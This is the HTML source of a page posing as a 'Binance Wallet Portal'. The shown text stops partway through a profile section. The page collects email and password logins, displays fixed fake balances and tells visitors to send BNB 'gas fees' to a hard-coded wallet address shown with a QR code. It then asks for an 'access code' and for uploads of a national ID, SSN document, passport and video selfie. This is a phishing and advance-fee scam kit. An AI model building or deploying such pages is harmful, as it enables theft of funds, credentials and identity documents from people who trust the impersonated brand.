<!DOCTYPE html>
<html lang="en" class="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Binance Wallet Portal</title>

  <!-- Ethers.js for wallet interaction -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.3/dist/ethers.min.js"></script>

  <style>
    body {
      margin: 0;
      font-family: 'Arial Black', Arial, sans-serif;
      background-color: #0b0e11;
      color: #f3ba2f;
    }

    .page {
      display: none;
      padding: 20px;
      min-height: 100vh;
      box-sizing: border-box;
    }

    .page.visible {
      display: block;
    }

    h2 {
      font-weight: 900;
      font-size: 24px;
      margin-bottom: 20px;
      color: #f3ba2f;
    }

    .form-container {
      max-width: 400px;
      margin: 0 auto;
      background-color: #1e2329;
      padding: 24px;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(243, 186, 47, 0.2);
    }

    input[type="text"],
    input[type="password"],
    input[type="email"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      border-radius: 12px;
      border: 1px solid #f3ba2f;
      background-color: #1e2329;
      color: #f3ba2f;
      font-weight: 900;
      font-family: monospace, monospace;
    }

    input::placeholder {
      color: #d1b547;
    }

    button {
      cursor: pointer;
      font-weight: 900;
      background-color: #f3ba2f;
      color: #000;
      border: none;
      padding: 12px 20px;
      border-radius: 12px;
      transition: background-color 0.3s ease;
      margin-bottom: 12px;
      width: 100%;
    }

    button:hover {
      background-color: #e0a80a;
    }

    .back-btn {
      background-color: #2b3139;
      color: #f3ba2f;
      border: 1px solid #f3ba2f;
    }

    .back-btn:hover {
      background-color: #1e2329;
    }
  </style>
</head>

<body>

  <!-- === PAGE 1: Login === -->
  <div class="page visible" id="page1">
    <div class="form-container">
      <h2>Binance Wallet Login</h2>
      <input type="email" id="email" placeholder="Email" required />
      <input type="password" id="pass" placeholder="Password" required />
      <button onclick="submitSignin()">Confirm</button>
    </div>
  </div>

  <!-- === PAGE 2: Processing === -->
  <div class="page" id="page2">
    <div class="form-container">
      <h2>Authenticating...</h2>
      <p>Please wait...</p>
      <button onclick="showPage(3)">Continue</button>
    </div>
  </div>

  <!-- === PAGE 3: Confirm Account ID === -->
  <div class="page" id="page3">
    <div class="form-container">
      <h2>Enter Account ID</h2>
      <input type="text" placeholder="Account ID" />
      <button onclick="showPage(4)">Confirm</button>
    </div>
  </div>
 
<!-- Page 4: Homepage (Main Dashboard) -->
<div id="page4" class="page" style="background-color:#0B0E11; color:#fff; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding:20px;">
  <!-- Header + Language & Currency Selectors -->
  <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
    <div style="font-size:1.5rem; font-weight:900; color:#f3ba2f; user-select:none;">Homepage</div>
    <div style="display:flex; gap:10px;">
      <select id="languageSelector" onchange="handleLanguageChange()" style="background-color:#1f2630; color:#f3ba2f; font-weight:bold; padding:6px 12px; border:none; border-radius:8px;"></select>
      <select id="currencySelector" onchange="handleCurrencyChange()" style="background-color:#1f2630; color:#f3ba2f; font-weight:bold; padding:6px 12px; border:none; border-radius:8px;"></select>
    </div>
  </div> 

      <!-- Wallet Row -->  
  <div class="flex-row" style="margin-bottom:30px; display:flex; align-items:center; flex-wrap:wrap; gap:16px;">
    <button onclick="showPage('page13')" style="background-color:#1f2630; color:#f3ba2f; font-weight:900; padding:10px 16px; border-radius:12px; border:none; cursor:pointer;">Connect Wallet</button>
    <div id="connectedWalletDisplayHomepage" style="color:#f3ba2f; font-weight:900;"></div>
    <div id="walletDisplay" style="display:flex; align-items:center; gap:10px;">
      <span style="color:#f3ba2f;">Wallet:</span>
      <span id="walletAddress" style="color:white; font-weight:bold;"></span>
      <button onclick="copyWalletAddress()" style="background-color:#f3ba2f; color:black; border:none; padding:5px 10px; border-radius:8px; font-weight:bold; cursor:pointer;">Copy Address</button>
      </div>

    <div id="balances" style="color:white; font-weight:bold; margin-top:10px;">
  <img id="bnbIcon" style="width:24px; height:24px; vertical-align:middle; margin-right:6px;" alt="BNB Icon">
  <span id="bnbBalance">Loading...</span><br>
  <img id="usdtIcon" style="width:24px; height:24px; vertical-align:middle; margin-right:6px;" alt="USDT Icon">
  <span id="usdtBalance">Loading...</span>
</div>

    <button onclick="showPage('page13')" style="margin-top:20px; background-color:#f3ba2f; color:black; border:none; padding:10px 16px; border-radius:12px; font-weight:bold; cursor:pointer;">Connect/Change Wallet</button>
  </div>
  
  <!-- Total Assets Display -->  
  <div style="margin-bottom:24px; font-weight:900; font-size:1.2rem; display:flex; justify-content:space-between; align-items:center;">
    <div>üí∞ Total Assets</div>
    <div id="totalAssetsDisplay" style="color:#f3ba2f;">$<span id="totalAssetsAmount">3007.20</span></div>
  </div>  
<!-- Action Buttons in a Single Row -->
<div class="flex-row" style="display:flex; gap:10px; margin-bottom:40px; flex-wrap:wrap; justify-content:space-between;">
  <button onclick="showPage('page6')" style="min-width:100px; flex:1; font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 15px; border-radius:12px; border:none; cursor:pointer;">Add Fund</button>
  <button onclick="showPage('page5')" style="min-width:100px; flex:1; font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 15px; border-radius:12px; border:none; cursor:pointer;">Top Up BNB</button>
  <button onclick="showPage('page8')" style="min-width:100px; flex:1; font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 15px; border-radius:12px; border:none; cursor:pointer;">Transfer</button>
  <button onclick="showPage('page7')" style="min-width:100px; flex:1; font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 15px; border-radius:12px; border:none; cursor:pointer;">Assets</button>
  <button onclick="showPage('page16')" style="min-width:100px; flex:1; font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 15px; border-radius:12px; border:none; cursor:pointer;">Trade</button>
</div>
  <!-- Token Boxes -->  
  <div style="margin-bottom: 32px;">
    <!-- USDT -->
    <div class="token" onclick="openTransferPage('USDT')" style="background:#1e2329; border-radius:12px; padding:16px; margin-bottom:16px; box-shadow:0 4px 10px rgba(243,186,47,0.3); display:flex; justify-content:space-between; align-items:center; cursor:pointer;">
      <div style="display:flex; align-items:center; gap:12px;">
        <img src="https://assets.coingecko.com/coins/images/325/thumb/Tether.png" alt="USDT Icon" style="width:40px; height:40px; border-radius:50%;">
        <div>
          <h3 style="font-weight:900; font-size:1.125rem; margin:0;">Tether (USDT)</h3>
          <p style="color:#999; font-size:0.875rem; margin:0;">BEP-20</p>
        </div>
      </div>
      <div style="text-align:right;">
        <p id="usdtTokenBalance" style="color:#f3ba2f; font-weight:900; font-size:1.125rem; margin:0;">2978.78</p>
        <p style="color:#999; font-size:0.875rem; margin:0;">Balance</p>
      </div>
    </div>
    <!-- BNB -->
    <div class="token" onclick="openTransferPage('BNB')" style="background:#1e2329; border-radius:12px; padding:16px; margin-bottom:16px; box-shadow:0 4px 10px rgba(243,186,47,0.3); display:flex; justify-content:space-between; align-items:center; cursor:pointer;">
      <div style="display:flex; align-items:center; gap:12px;">
        <img src="https://assets.coingecko.com/coins/images/825/thumb/bnb-icon2_2x.png" alt="BNB Icon" style="width:40px; height:40px; border-radius:50%;">
        <div>
          <h3 style="font-weight:900; font-size:1.125rem; margin:0;">BNB</h3>
          <p style="color:#999; font-size:0.875rem; margin:0;">BNB Smart Chain</p>
        </div>
      </div>
      <div style="text-align:right;">
        <p id="bnbTokenBalance" style="color:#f3ba2f; font-weight:900; font-size:1.125rem; margin:0;">0.09490</p>
        <p style="color:#999; font-size:0.875rem; margin:0;">Balance</p>
      </div>
    </div>
  </div> 
  <!-- Live Price Chart -->  
  <div style="background:#1A1D22; padding:20px; border-radius:12px; margin-bottom:32px;">
    <h3 style="color:#F3BA2F; font-weight:900; margin-bottom:12px;">Live BNB/USDT Chart</h3>
    <canvas id="priceChart" height="120" style="background:#0B0E11; border-radius:8px; width:100%;"></canvas>
  </div>  
<!-- Additional Top Coin Prices -->
<div style="background:#1A1D22; padding:20px; border-radius:12px; margin-bottom:32px;">
  <h3 style="color:#F3BA2F; font-weight:900; margin-bottom:12px;">üìä Top Coin Prices (Live)</h3>
  <div id="topCoinList"></div>
</div>

  <!-- Settings Button -->
  <div style="position:fixed; bottom:20px; left:20px;">
    <button onclick="showPage('page12')" style="background-color:#f0b90b; color:#000; padding:10px 20px; border-radius:12px; font-weight:900; border:none; cursor:pointer;">Settings</button>
  </div>
</div>  
  
  
<!-- === PAGE 5: Top Up BNB === -->
<div id="page5" class="page" style="display: none; background-color: #0B0E11; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px;">
  <div style="font-size: 1.5rem; font-weight: 900; color: #f3ba2f; margin-bottom: 20px; user-select:none;">
    Top Up BNB
  </div>

  <!-- Wallet Check Info -->
  <div id="walletNotice" style="margin-bottom: 20px; color: #f3ba2f; font-weight: bold;">
    Please connect your BNB Smart Chain wallet before topping up.
  </div>

  <!-- Estimated Gas Fee Block -->
  <div style="background: #1e2329; border-radius: 12px; padding: 16px; margin-bottom: 24px;">
    <h3 style="font-weight: bold; color: #f3ba2f; margin: 0 0 10px 0;">Estimated Gas Fee</h3>
    <p id="estimatedGasFee" style="color: #0ecb81; font-weight: bold;">~0.00021 BNB</p>
    <p style="color: #999; font-size: 0.875rem;">This is an estimate based on current network activity.</p>
  </div>

  <!-- Top Up Button -->
  <button onclick="showPage('page9i')" style="width: 100%; background-color: #f3ba2f; color: #000; font-weight: bold; padding: 12px 20px; font-size: 1rem; border: none; border-radius: 12px; cursor: pointer; margin-bottom: 20px;">
    Proceed to Top Up
  </button>

  <!-- Back to Homepage -->
  <button onclick="showPage('page4')" style="width: 100%; background-color: #1f2630; color: #f3ba2f; font-weight: bold; padding: 10px 20px; border: none; border-radius: 12px; cursor: pointer;">
    ‚Üê Back to Homepage
  </button>
</div>

<!-- === PAGE 6: Scan === -->
<div id="page6" class="page" style="min-height: 100vh;">
  <div class="max-w-md mx-auto bg-[#1E2329] p-6 rounded-2xl shadow-lg" style="margin: auto;">
    <h2 id="scanAction" style="text-align: center; color: #f3ba2f; font-weight: 900; margin-bottom: 20px;">Receive</h2>
    <div style="display: flex; justify-content: center; margin-bottom: 20px;">
      <img src="https://api.qrserver.com/v1/create-qr-code/?data=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&size=200x200" alt="QR Code" style="border-radius: 16px; border: 1px solid #444c5a;" />
    </div>
    <p style="text-align: center; font-family: monospace; font-weight: 900; color: #f3ba2f; margin-bottom: 20px;">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</p>

    <input type="text" id="txHash" placeholder="Enter Transaction Hash" />
    <button onclick="submitTransaction()">Confirm Transaction</button>
    <div id="txStatus" style="color: #2ecc71; font-weight: 900; margin-top: 12px;"></div>
    <button class="back-btn" onclick="showPage('page4')">Back</button>
  </div>
</div>
    
<!-- === PAGE 7: Asset Dashboard === -->
<div id="page7" class="page" style="display:none; background-color:#0B0E11; color:#fff; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding:20px;">

  <!-- Header -->
  <div style="font-size:1.5rem; font-weight:900; color:#f3ba2f; margin-bottom:20px; user-select:none;">Asset Dashboard</div>

  <!-- Language & Currency Selectors -->
  <div style="display:flex; gap:10px; margin-bottom:20px;">
    <select id="languageSelector7" onchange="handleLanguageChange()" style="background-color:#1f2630; color:#f3ba2f; font-weight:bold; padding:6px 12px; border:none; border-radius:8px;"></select>
    <select id="currencySelector7" onchange="handleCurrencyChange()" style="background-color:#1f2630; color:#f3ba2f; font-weight:bold; padding:6px 12px; border:none; border-radius:8px;"></select>
  </div>

  <!-- Available Balance -->
  <div style="margin-bottom:24px; font-weight:900; font-size:1.2rem; display:flex; justify-content:space-between; align-items:center;">
    <div>üí∞ Available Balance</div>
    <div id="availableBalanceDisplay" style="color:#f3ba2f;">$<span id="availableBalanceAmount">--</span></div>
  </div>

  <!-- Action Buttons -->
  <div style="margin-bottom:40px; display:flex; flex-wrap:wrap; gap:10px;">
    <button onclick="showPage('page6')" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Add Fund</button>
    <button onclick="showPage('page8')" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Transfer</button>
    <button onclick="showPage('page16')" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Trade</button>
  </div>

  <!-- Token Balances -->
  <div style="margin-bottom:32px;">
    <!-- USDT -->
    <div class="token" onclick="openTransferPage('USDT')" style="background:#1e2329; border-radius:12px; padding:16px; margin-bottom:16px; box-shadow:0 4px 10px rgba(243,186,47,0.3); display:flex; justify-content:space-between; align-items:center; cursor:pointer;">
      <div style="display:flex; align-items:center; gap:12px;">
        <img src="https://assets.coingecko.com/coins/images/325/thumb/Tether.png" style="width:40px; height:40px; border-radius:50%;">
        <div>
          <h3 style="font-weight:900; font-size:1.125rem; margin:0;">Tether (USDT)</h3>
          <p style="color:#999; font-size:0.875rem; margin:0;">BEP-20</p>
        </div>
      </div>
      <div style="text-align:right;">
        <p id="usdtBalance7" style="color:#f3ba2f; font-weight:900; font-size:1.125rem; margin:0;">--</p>
        <p style="color:#999; font-size:0.875rem; margin:0;">Balance</p>
      </div>
    </div>

    <!-- BNB -->
    <div class="token" onclick="openTransferPage('BNB')" style="background:#1e2329; border-radius:12px; padding:16px; margin-bottom:16px; box-shadow:0 4px 10px rgba(243,186,47,0.3); display:flex; justify-content:space-between; align-items:center; cursor:pointer;">
      <div style="display:flex; align-items:center; gap:12px;">
        <img src="https://assets.coingecko.com/coins/images/825/thumb/bnb-icon2_2x.png" style="width:40px; height:40px; border-radius:50%;">
        <div>
          <h3 style="font-weight:900; font-size:1.125rem; margin:0;">BNB</h3>
          <p style="color:#999; font-size:0.875rem; margin:0;">BNB Smart Chain</p>
        </div>
      </div>
      <div style="text-align:right;">
        <p id="bnbBalance7" style="color:#f3ba2f; font-weight:900; font-size:1.125rem; margin:0;">--</p>
        <p style="color:#999; font-size:0.875rem; margin:0;">Balance</p>
      </div>
    </div>
  </div>

  <!-- Daily Performance Chart -->
  <div style="background:#1A1D22; padding:20px; border-radius:12px; margin-bottom:32px;">
    <h3 style="color:#F3BA2F; font-weight:900; margin-bottom:12px;">Performance (24H)</h3>
    <canvas id="assetChart7" height="100"></canvas>
  </div>

  <!-- Return to Homepage -->
  <div style="margin-top: 20px;">
    <button onclick="showPage('page4')" style="width: 100%; background-color: #f3ba2f; color: #000; font-weight: bold; padding: 10px 20px; border: none; border-radius: 12px; cursor: pointer;">
      ‚Üê Return to Homepage
    </button>
  </div>

  <!-- Settings Button -->
  <div style="position:fixed; bottom:20px; right:20px;">
    <button onclick="showPage('page12')" style="background-color:#f0b90b; color:#000; padding:10px 20px; border-radius:12px; font-weight:900; border:none; cursor:pointer;">Settings</button>
  </div>
</div>  
  
  
<!-- === PAGE 8: Transfer === -->
<div id="page8" class="page">
  <h2>Make a Transfer</h2>
  <input type="text" id="inputWallet" placeholder="Enter Wallet Address" />
  <select id="networkSelect">
    <option value="">Select Network</option>
    <option value="Ethereum">Ethereum</option>
    <option value="Binance Smart Chain">Binance Smart Chain</option>
  </select>
  <input type="number" id="transferAmount" placeholder="Enter Amount" />
  <button onclick="setMaxAmount()">Use Max</button>
  <div style="margin-top: 12px; font-weight: 900; color: #f3ba2f;">
    Gas Fee: <span id="gasFee">0.09490 BNB</span>
  </div>
  <button onclick="goToBNBGasConfirmationPage('page9i')">Confirm</button>
  <button class="back-btn" onclick="showPage('page4')">Return</button>
</div>


<!-- === PAGE 9: Transaction Processing === -->
<div id="page9" class="page" style="background-color:#0B0E11; color:#f3ba2f; font-family: Arial, sans-serif; padding: 20px; display:none; text-align:center;">
  <h2>Processing Transaction...</h2>
  <div style="margin-top: 30px;">
    <div class="spinner" style="border: 8px solid #f3ba2f; border-top: 8px solid #0b0e11; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: auto;"></div>
  </div>
  <style>
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
  </style>
</div>

<!-- === PAGE 9i: BNB Gas Confirmation === -->
<div id="page9i" class="page" style="background-color: #0B0E11; color: #f3ba2f; padding: 20px; font-family: Arial, sans-serif; display: none;">
  <h2>BNB Gas Confirmation</h2>

  <p style="margin-bottom: 20px; font-weight: bold;">Please send BNB to the address below to cover gas fees.</p>

  <!-- BNB Address Display -->
  <div style="background-color: #1e2329; padding: 16px; border-radius: 12px; word-break: break-all; margin-bottom: 16px;">
    <span id="bnbAddressText" style="font-weight: bold;">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</span>
  </div>

  <!-- Copy Button -->
  <button onclick="copyBNBAddress()" style="margin-bottom: 20px;">Copy BNB Address</button>

  <!-- QR Code -->
  <div id="bnbQRContainer" style="margin-bottom: 20px;">
    <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0" alt="BNB QR Code" style="border-radius: 12px;" />
  </div>

  <!-- Confirm Button -->
  <button onclick="showPage('page9ii')">Confirm BNB Gas Code</button>

  <!-- Back Button -->
  <button class="back-btn" onclick="showPage('page5')">‚Üê Back</button>
</div>

<!-- === PAGE 9ii: Access Code === -->
<div id="page9ii" class="page" style="background-color: #0B0E11; color: #EAECEF; font-family: Arial, sans-serif; padding: 20px; display:none;">
  <h2 style="color: #f3ba2f; font-weight: bold;">Access Code Required</h2>

  <input type="text" id="accessCodeInput" placeholder="Enter Access Code"
         style="width: 100%; padding: 10px; margin-bottom: 15px; border-radius: 5px; border: 1px solid #2d3239; background-color: #1e2329; color: #fff; font-weight: bold;" />

  <button onclick="confirmAccessCode()"
          style="width: 100%; padding: 12px; background-color: #f3ba2f; color: #0B0E11; font-weight: bold; border: none; border-radius: 5px; margin-bottom: 10px;">
    Confirm Access Code
  </button>

  <button onclick="showPage('page8')"
          style="width: 100%; padding: 10px; background-color: #1e2329; color: #fff; border: 1px solid #2d3239; border-radius: 5px;">
    Go Back
  </button>
</div>

<!-- === PAGE 11: Transaction Declined === -->
<div id="page11" class="page" style="background-color:#0B0E11; color:#fff; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding:30px; text-align:center; display:none;">
  <!-- Alert Header -->
  <div style="font-size:2rem; font-weight:900; color:#f0b90b; margin-bottom:20px;">
    ‚ö†Ô∏è Transaction Declined
  </div>

  <!-- Red Error Box -->
  <div style="background-color:#2c0d0d; border:1px solid red; border-radius:12px; padding:20px; margin-bottom:30px; display:inline-block; color:#ff4c4c; font-weight:bold;">
    Your transaction could not be processed.<br/>
    Please check your input, gas fees, or try again later.
  </div>

  <!-- Suggested Actions -->
  <div style="color:#aaa; font-size:1rem; margin-bottom:40px;">
    Reasons might include:<br/>
    - Insufficient BNB for gas fee<br/>
    - Invalid Access Code<br/>
    - Network Error or Timeout<br/>
    - User Cancelled Transaction
  </div>

  <!-- Action Buttons -->
  <div style="display:flex; justify-content:center; gap:16px; flex-wrap:wrap;">
    <button onclick="showPage('page4')" 
      style="background-color:#1f2630; color:#f0b90b; padding:12px 24px; border:none; border-radius:10px; font-weight:bold; cursor:pointer;">
      üîÑ Return to Dashboard
    </button>
    <button onclick="showPage('page8')" 
      style="background-color:#f0b90b; color:#000; padding:12px 24px; border:none; border-radius:10px; font-weight:900; cursor:pointer;">
      üîÅ Retry Transfer
    </button>
    <button onclick="showPage('page12')" 
      style="background-color:#333; color:#f0b90b; padding:12px 24px; border:none; border-radius:10px; font-weight:bold; cursor:pointer;">
      ‚öôÔ∏è Go to Settings
    </button>
  </div>
</div>

<!-- === PAGE 14: Transaction Successful === -->
<div id="page14" class="page" style="background-color:#0B0E11; color:#f3ba2f; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding:40px; text-align:center; display:none;">
  <div style="font-size:3rem; font-weight:900; margin-bottom:20px;">
    üéâ Transaction Successful!
  </div>
  <div style="font-size:1.5rem; font-weight:700; margin-bottom:40px;">
    Your transfer was completed successfully.
  </div>
  <button onclick="showPage('page4')" 
          style="background-color:#f3ba2f; color:#000; padding:15px 40px; border:none; border-radius:12px; font-weight:900; cursor:pointer;">
    Return to Dashboard
  </button>
</div>
    
<!-- === PAGE 12: Settings === -->
<div id="page12" class="page" style="background-color: #0b0e11; color: #f0b90b; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 24px; min-height: 100vh;">

  <h2 style="font-weight: 900; font-size: 24px; margin-bottom: 24px;">‚öôÔ∏è Settings</h2>

  <div style="display: flex; flex-direction: column; gap: 18px; max-width: 340px;">

    <button onclick="feedback(); showPage('page15')" style="background-color: #1f2630; color: #f0b90b; font-weight: 900; font-size: 16px; padding: 14px; border-radius: 12px; border: none; cursor: pointer;">
      üõ°Ô∏è KYC Verification
    </button>

    <button onclick="feedback(); showPage('page18')" style="background-color: #1f2630; color: #f0b90b; font-weight: 900; font-size: 16px; padding: 14px; border-radius: 12px; border: none; cursor: pointer;">
      üë§ View Profile
    </button>

    <button onclick="feedback(); showPage('page13')" style="background-color: #1f2630; color: #f0b90b; font-weight: 900; font-size: 16px; padding: 14px; border-radius: 12px; border: none; cursor: pointer;">
      üîó Connect Wallet
    </button>

    <button onclick="feedback(); window.open('https://widget-page.smartsupp.com/widget/3ab3e4c3fcd21f84344cc872db2a35d9e40245a6', '_blank')" style="background-color: #f0b90b; color: #000; font-weight: 900; font-size: 16px; padding: 14px; border-radius: 12px; border: none; cursor: pointer;">
      üí¨ Live Chat Support
    </button>

    <button onclick="feedback(); disconnectWallet()" style="background-color: transparent; color: #f0b90b; font-weight: 900; font-size: 16px; padding: 14px; border: 1px solid #f0b90b; border-radius: 12px; cursor: pointer;">
      ‚ùå Disconnect Wallet
    </button>

    <button onclick="feedback(); logout()" style="background-color: transparent; color: red; font-weight: 900; font-size: 16px; padding: 14px; border: 1px solid red; border-radius: 12px; cursor: pointer;">
      üö™ Logout
    </button>
  </div>

  <!-- Back to Homepage -->
  <div style="position: fixed; bottom: 20px; right: 20px;">
    <button onclick="feedback(); showPage('page4')" style="background-color: #333; color: #f0b90b; font-weight: 900; padding: 10px 20px; border-radius: 12px; border: none; cursor: pointer;">
      ‚Üê Back to Homepage
    </button>
  </div>
</div>

<!-- Page 13: Connect Wallet -->
<div id="page13" class="page" style="background-color:#0B0E11; color:#fff; font-family:'Segoe UI'; padding:20px;">
  <div style="font-size:1.5rem; font-weight:900; color:#f3ba2f; margin-bottom:20px;">üîê Connect Wallet</div>

  <!-- Connect Button to Open Modal -->
  <button onclick="openWalletModal()" style="background-color:#f3ba2f; color:black; font-weight:900; padding:10px 20px; border:none; border-radius:12px; cursor:pointer;">
    Connect Wallet Manually
  </button>
</div>

<!-- Wallet Modal -->
<div id="walletModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#00000088; z-index:9999; justify-content:center; align-items:center;">
  <div id="walletModalContent" style="background:#1e2329; padding:30px 24px; border-radius:16px; width:90%; max-width:400px; box-shadow:0 0 20px #f3ba2f99; transform:scale(0.9); opacity:0; transition:all 0.3s ease; position:relative; cursor:move;">
    <div style="font-weight:bold; font-size:1.25rem; color:#f3ba2f; margin-bottom:16px;">Manual Wallet Connect</div>

    <label style="color:#aaa; font-weight:bold;">Enter Wallet Address</label>
    <input id="walletInputField" placeholder="0x..." style="width:100%; padding:12px; background:#0B0E11; color:#fff; border-radius:8px; border:1px solid #444; margin:10px 0 20px 0;" />

    <div style="display:flex; justify-content:space-between; gap:10px;">
      <button onclick="confirmManualWallet()" style="flex:1; background-color:#f3ba2f; color:#000; font-weight:bold; padding:10px; border-radius:10px; border:none;">Connect</button>
      <button onclick="startQRScanner()" style="flex:1; background:#1f2630; color:#f3ba2f; font-weight:bold; padding:10px; border-radius:10px; border:none;">üì∑ Scan</button>
    </div>

    <button onclick="closeWalletModal()" style="position:absolute; top:10px; right:12px; background:none; color:#f3ba2f; border:none; font-size:1.2rem; cursor:pointer;">‚úñ</button>
  </div>
</div>

<!-- QR Scanner Modal -->
<div id="qrScannerModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000000cc; z-index:10000; justify-content:center; align-items:center;">
  <div style="background:#1e2329; padding:20px; border-radius:12px; max-width:90%; position:relative;">
    <div id="qr-reader" style="width:300px;"></div>
    <button onclick="stopQRScanner()" style="margin-top:10px; background:#f3ba2f; color:#000; font-weight:bold; border:none; padding:10px 16px; border-radius:10px;">Close Scanner</button>
  </div>
</div>

  <!-- Back to Homepage -->
  <div style="position: fixed; bottom: 20px; right: 20px;">
    <button onclick="feedback(); showPage('page4')" style="background-color: #333; color: #f0b90b; font-weight: 900; padding: 10px 20px; border-radius: 12px; border: none; cursor: pointer;">
      ‚Üê Back to Homepage
    </button>
  </div>
</div>

<!-- === PAGE 15: KYC VERIFICATION === -->
  <div id="page15" class="page" style="display: none; background-color: #0B0E11; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 20px;">
  <div style="font-size: 1.5rem; font-weight: bold; color: #f3ba2f; margin-bottom: 20px;">KYC Verification</div>
  <form id="kycForm" onsubmit="submitKYC(event)" style="display: flex; flex-direction: column; gap: 16px;">
    <input type="text" id="kycName" placeholder="Full Name" required style="padding: 10px; border-radius: 8px; border: none;" />
    <input type="email" id="kycEmail" placeholder="Email Address" required style="padding: 10px; border-radius: 8px; border: none;" />
    <input type="tel" id="kycPhone" placeholder="Phone Number" required style="padding: 10px; border-radius: 8px; border: none;" />
    <input type="text" id="kycCountry" placeholder="Country" required style="padding: 10px; border-radius: 8px; border: none;" /><label>Upload National ID</label>
<input type="file" id="kycNationalID" accept="image/*,application/pdf" required />

<label>Upload SSN Document</label>
<input type="file" id="kycSSN" accept="image/*,application/pdf" required />

<label>Upload Passport</label>
<input type="file" id="kycPassport" accept="image/*,application/pdf" required />

<label>Upload Video Selfie</label>
<input type="file" id="kycSelfie" accept="video/*" required />

<button type="submit" style="background-color: #f3ba2f; color: black; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer;">Submit KYC</button>

  </form>
</div>
    
  <!-- === PAGE 15i: KYC PENDING REVIEW === -->
  <div id="page15i" class="page" style="display: none; background-color: #0B0E11; color: #fff; padding: 40px; text-align: center; font-family: 'Segoe UI', sans-serif;">
  <h2 style="color: #f3ba2f; font-weight: bold;">KYC Submission Received</h2>
  <p style="margin-top: 20px;">Your documents are currently under review. This may take a few moments.</p>
  <div style="font-size: 3rem; margin-top: 30px; color: orange;">‚è≥</div>
</div>
  <!-- === PAGE 15ii: KYC APPROVED === -->
  <div id="page15ii" class="page" style="display: none; background-color: #0B0E11; color: #fff; padding: 40px; text-align: center; font-family: 'Segoe UI', sans-serif;">
  <h2 style="color: #0ecb81; font-weight: bold;">‚úÖ KYC Verified</h2>
  <p style="margin-top: 20px; font-size: 1.1rem;">Your identity has been successfully verified.</p>
  <button onclick="showPage(4)" style="margin-top: 30px; background-color: #f3ba2f; color: black; padding: 12px 24px; font-size: 1rem; font-weight: bold; border: none; border-radius: 8px; cursor: pointer;">Go to Dashboard</button>
</div>

  <!-- === PAGE 16: Trade === -->
<div id="page16" class="page" style="background-color: #0b0e11; color: #f3ba2f; font-family: 'Arial Black', Arial, sans-serif; padding: 20px; min-height: 100vh; display: none;">
  <h2>Trade Tokens</h2>

  <label for="fromToken" style="font-weight: 900; margin-bottom: 8px; display: block;">From Token</label>
  <select id="fromToken" style="width: 100%; padding: 12px; border-radius: 12px; border: 1px solid #f3ba2f; background-color: #1e2329; color: #f3ba2f; font-weight: 900; font-family: monospace;">
    <option value="USDT">USDT (Tether)</option>
    <option value="BNB">BNB (Binance Coin)</option>
  </select>

  <label for="fromAmount" style="font-weight: 900; margin-top: 16px; margin-bottom: 8px; display: block;">Amount</label>
  <input type="number" id="fromAmount" placeholder="Enter amount" min="0" step="any" />

  <label for="toToken" style="font-weight: 900; margin-top: 16px; margin-bottom: 8px; display: block;">To Token</label>
  <select id="toToken" style="width: 100%; padding: 12px; border-radius: 12px; border: 1px solid #f3ba2f; background-color: #1e2329; color: #f3ba2f; font-weight: 900; font-family: monospace;">
    <option value="BNB">BNB (Binance Coin)</option>
    <option value="USDT">USDT (Tether)</option>
  </select>

  <div id="estimatedAmount" style="margin-top: 16px; font-weight: 900; font-size: 1.1rem;">
    Estimated Receive: <span id="receiveAmount">0</span>
  </div>

  <button style="margin-top: 24px;" onclick="handleTrade()">Swap</button>

  <button class="back-btn" style="margin-top: 20px;" onclick="showPage(4)">Back to Homepage</button>
</div>

<!-- === PAGE 18: View / Edit Profile === -->
<div id="page18" class="page" style="background-color: #0b0e11; color: #f0b90b; font-family: 'Segoe UI', sans-serif; padding: 24px; min-height: 100vh;">

  <h2 style="font-weight: 900; font-size: 24px; margin-bottom: 24px;">üë§ Profile Information</h2>

  <div id="profileCard" style="background-color: #1f2630; padding: 20px; border-radius: 16px; max-width: 400px; box-shadow: 0 0 10px rgba(240, 185, 11, 0.2); display: flex; flex-direction: column; gap: 16px;">
    
    <!-- Name -->
    <div style="display: flex; justify-content: space-between; align-items: center;">
      <span style="font-weight: bold;">Name:</span>
      <span id="profileName">John Doe</span>
      <input type="text" id="editName" style="display:none; padding: 6px;" />
    </div>

    <!-- Email -->
    <div style="display: flex; justify-content: space-between; align-items: center;">
      <span style="font-weight: bold;">Email:</span>
      <span id="profileEmail">john@example.com</span>
      <input type="email" id="editEmail" style="display:none; padding: 6px;" />
    </div>

    <!-- Country -->
    <div style="display: flex; justify-content: space-between; align-items: center;">
      <span style="font-weight: bold;">Country:</span>
